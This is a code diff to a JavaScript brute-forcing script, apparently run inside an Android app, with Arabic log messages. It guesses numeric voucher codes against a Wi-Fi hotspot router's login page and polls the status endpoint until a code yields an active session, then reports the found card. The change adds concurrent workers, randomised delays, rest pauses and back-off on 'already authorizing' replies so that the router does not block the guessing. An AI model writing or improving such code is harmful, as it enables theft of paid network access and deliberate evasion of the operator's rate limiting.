@@ -52,12 +52,6 @@
         const u = String(st.username || '').trim();
         return (u && u !== '-' && u !== 'N/A' && u !== '---') ? u : null;
     }
-    function uptimeSec(s) {
-        if (!s) return -1;
-        const m = String(s).trim().match(/^(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/);
-        if (!m) return -1;
-        return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
-    }
 
     async function run() {
         try {
@@ -65,20 +59,15 @@
             const statusUrl = base + '/status?var=callBack';
             const loginUrl = base + '/login';
 
-            log('▶ بدء التخمين (مع قراءة ردود الراوتر)');
+            log('▶ بدء التخمين (خيوط مستقلة)');
             const tried = new Set(CFG.tried || []);
             log('  تم تجربة ' + tried.size + ' رقم سابقاً');
             
             const init = await safeJson(statusUrl);
             if (init && isActive(init)) {
                 const u = statusUser(init);
-                if (u) {
-                    log('✓ كرت مسجل موجود: ' + u);
-                    window.AndroidBridge.found(u, JSON.stringify(init));
-                    return;
-                }
-                log('⚠ جلسة نشطة، username مخفي');
-                return;
+                if (u) { log('✓ كرت مسجل موجود: ' + u); window.AndroidBridge.found(u, JSON.stringify(init)); return; }
+                log('⚠ جلسة نشطة'); return;
             }
 
             let template = { username: '', password: '', dst: base + '/', popup: 'true' };
@@ -95,22 +84,13 @@
             } catch(e) { }
 
             const maxVal = Math.pow(10, CFG.digits) - 1;
-            if (tried.size > maxVal) {
-                log('⚠ تم استنفاد جميع الأرقام الممكنة!');
-                return;
-            }
-
-            const beforeUp = init ? uptimeSec(init.uptime) : -1;
-            const beforeActive = isActive(init);
-            
             let done = 0;
-            let batchCount = 0;
+            let since_rest = 0;
+            let routerBusy = false;
             
-            // إجبار التأخير ليكون 200ms على الأقل حتى لا يغلق الراوتر
-            const USER_DELAY = CFG.pause || 300;
-            const DELAY_MIN = Math.max(200, USER_DELAY); 
+            const MAX_CONCURRENT = CFG.threads || 4;
+            const DELAY_MIN = Math.max(200, CFG.pause || 300); 
             const DELAY_MAX = DELAY_MIN * 2;
-            const MAX_CONCURRENT = CFG.threads || 3;
             const BATCH_SIZE = CFG.statusEvery || 50;
             const BATCH_REST = 5000;
             const RETRY_DELAY = CFG.retryDelay || 1500;
@@ -129,9 +109,6 @@
             }
 
             async function post(v) {
-                const delay = Math.floor(Math.random() * (DELAY_MAX - DELAY_MIN + 1)) + DELAY_MIN;
-                await sleep(delay);
-
                 const body = new URLSearchParams();
                 for (const k in template) body.set(k, template[k]);
                 body.set('username', v);
@@ -142,120 +119,96 @@
                 
                 try {
                     const r = await fetch(loginUrl, {
-                        method: 'POST', body: body.toString(),
-                        credentials: 'include',
+                        method: 'POST', body: body.toString(), credentials: 'include',
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        redirect: 'manual',
-                        signal: controller.signal
+                        redirect: 'manual', signal: controller.signal
                     });
                     clearTimeout(timeoutId);
                     
                     let text = '';
-                    if (r.status !== 302 && r.status !== 301) {
-                        text = await r.text();
-                    }
+                    if (r.status !== 302 && r.status !== 301) text = await r.text();
                     
-                    let errMsg = '';
-                    let isBad = false;
+                    let errMsg = '', isBusy = false, isBad = false;
                     
                     if (text) {
-                        // استخراج رسالة الخطأ من صفحة الراوتر
-                        const match = text.match(/class="[^"]*(?:error|fail|alert|info)[^"]*"[^>]*>([^<]+)</i) || 
-                                      text.match(/<div[^>]*style="[^"]*color:\s*red[^"]*"[^>]*>([^<]+)</i);
-                        if (match && match[1]) {
-                            errMsg = match[1].trim();
+                        if (text.includes('already authorizing')) {
+                            errMsg = 'already authorizing'; isBusy = true;
                         } else {
                             const stripped = text.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
                             if (stripped.toLowerCase().includes('authorizing')) {
-                                errMsg = 'already authorizing, retry later';
+                                errMsg = 'already authorizing'; isBusy = true;
                             } else if (stripped.toLowerCase().includes('invalid') || stripped.toLowerCase().includes('error') || stripped.toLowerCase().includes('fail')) {
-                                const idx = Math.max(0, stripped.toLowerCase().indexOf('error') - 20);
-                                errMsg = stripped.substring(idx, idx + 80).trim();
+                                isBad = true;
+                                const idx = Math.max(0, stripped.toLowerCase().indexOf('error') - 10);
+                                errMsg = stripped.substring(idx, idx + 50).trim();
                             }
                         }
-                        
-                        if (errMsg) isBad = true;
                     }
-                    
-                    return { v, code: r.status, text, errMsg, isBad };
+                    return { v, code: r.status, errMsg, isBusy, isBad };
                 } catch(e) {
                     clearTimeout(timeoutId);
                     return { v, code: 0, errMsg: 'Network Error', isBad: true };
                 }
             }
 
-            while (done < CFG.attempts && !stopped) {
-                if (done > 0 && done % BATCH_SIZE === 0 && batchCount > 0) {
-                    log('💤 استراحة ' + (BATCH_REST/1000) + ' ثواني...');
-                    await sleep(BATCH_REST);
-                    batchCount = 0;
-                }
+            // سيقوم كل خيط بالعمل بشكل مستقل تماماً
+            async function worker() {
+                while (done < CFG.attempts && !stopped) {
+                    if (routerBusy) { await sleep(RETRY_DELAY); continue; }
 
-                const batch = [];
-                for (let j = 0; j < MAX_CONCURRENT && done < CFG.attempts; j++) {
+                    if (since_rest >= BATCH_SIZE) {
+                        log('💤 استراحة ' + (BATCH_REST/1000) + ' ثواني...');
+                        since_rest = 0;
+                        await sleep(BATCH_REST);
+                        continue;
+                    }
+
                     const v = gen();
                     if (!v) break;
+
                     done++;
-                    
+                    since_rest++;
+
                     updatePageInput(v);
                     log('🔍 ' + v);
-                    
                     try { window.AndroidBridge.progress(done, CFG.attempts, v); } catch(e){}
-                    batch.push(post(v));
-                }
-                if (batch.length === 0) {
-                    log('⚠ لا توجد أرقام جديدة متبقية.');
-                    break;
-                }
-                
-                batchCount += batch.length;
-                const results = await Promise.all(batch);
 
-                let routerBusy = false;
+                    // كل خيط يأخذ وقتاً مختلفاً قبل إرسال الطلب
+                    const delay = Math.floor(Math.random() * (DELAY_MAX - DELAY_MIN + 1)) + DELAY_MIN;
+                    await sleep(delay);
+                    
+                    if (stopped) break;
+                    
+                    const res = await post(v);
 
-                for (const r of results) {
-                    if (r.code === 429 || r.code === 503) {
-                        log('🛑 حظر من الراوتر (كود ' + r.code + ')');
+                    if (res.isBusy) {
+                        log('🛑 الراوتر قال: ' + res.errMsg + ' → انتظار...');
                         routerBusy = true;
-                    } else if (r.code === 0) {
-                        log('⚠ خطأ شبكة: ' + r.v);
-                    } else if (r.isBad) {
-                        if (r.errMsg.toLowerCase().includes('authorizing')) {
-                            log('🛑 ' + r.v + ' → الراوتر قال: ' + r.errMsg);
-                            routerBusy = true;
-                        } else {
-                            log('❌ ' + r.v + ' → ' + r.errMsg);
-                        }
-                    }
-                }
-
-                if (routerBusy) {
-                    log('⏳ الراوتر مشغول أو يحظر المحاولات. انتظار ' + (RETRY_DELAY/1000) + ' ثانية...');
-                    await sleep(RETRY_DELAY);
-                }
-
-                const needCheck = results.some(r => r.code > 0 && r.code !== 429 && r.code !== 503 && !r.isBad);
-                if (needCheck) {
-                    await sleep(200);
-                    const st = await safeJson(statusUrl);
-                    const u = statusUser(st);
-                    if (u) {
-                        log('✅✅✅ كشف عبر status: ' + u);
-                        window.AndroidBridge.found(u, JSON.stringify(st));
-                        return;
-                    }
-                    const up = uptimeSec(st && st.uptime);
-                    if (st && isActive(st) && !beforeActive && up >= 0 && up <= 15) {
-                        const cand = results.find(r => r.code > 0);
-                        if (cand) { 
-                            log('✅✅✅ جلسة جديدة: ' + cand.v); 
-                            window.AndroidBridge.found(cand.v, JSON.stringify(st)); 
-                            return; 
+                        setTimeout(() => { routerBusy = false; }, RETRY_DELAY);
+                    } else if (res.isBad) {
+                        log('❌ ' + v + ' → ' + res.errMsg);
+                    } else if (res.code > 0 && res.code !== 429 && res.code !== 503) {
+                        await sleep(100);
+                        const st = await safeJson(statusUrl);
+                        const u = statusUser(st);
+                        if (u) {
+                            log('✅✅✅ وجد الكرت: ' + u);
+                            window.AndroidBridge.found(u, JSON.stringify(st));
+                            stopped = true;
+                            return;
                         }
                     }
                 }
             }
-            log('❌ انتهى — ' + done + ' محاولة جديدة');
+
+            // تشغيل الخيوط
+            const workers = [];
+            for (let i = 0; i < MAX_CONCURRENT; i++) {
+                workers.push(worker());
+            }
+            await Promise.all(workers);
+            
+            log('❌ انتهى — ' + done + ' محاولة');
         } catch(e) {
             log('❌ خطأ: ' + e.message);
         }
